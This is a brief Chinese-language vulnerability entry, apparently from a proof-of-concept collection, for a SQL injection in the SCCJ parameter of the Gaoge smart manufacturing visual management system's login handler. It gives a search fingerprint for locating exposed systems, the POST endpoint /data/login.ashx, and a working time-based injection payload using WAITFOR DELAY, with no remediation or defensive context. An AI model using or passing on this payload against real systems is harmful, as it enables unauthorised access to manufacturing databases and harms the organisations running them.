# 高格智能制造目视化系统SCCJ参数存在SQL注入漏洞

高格智能制造目视化系统SCCJ参数 ｜ SQL注入 ｜ —
- **指纹**：`title="高格智能制造目视化系统"`
- **请求**：`POST /data/login.ashx HTTP/1.1`

**Payload**
```
UNAMESM=&UNAME=&PWD=&pgbg=false&gdbg=true&SCCJ=14';WAITFOR DELAY '0:0:0'--&type=0
```
- **响应特征**：200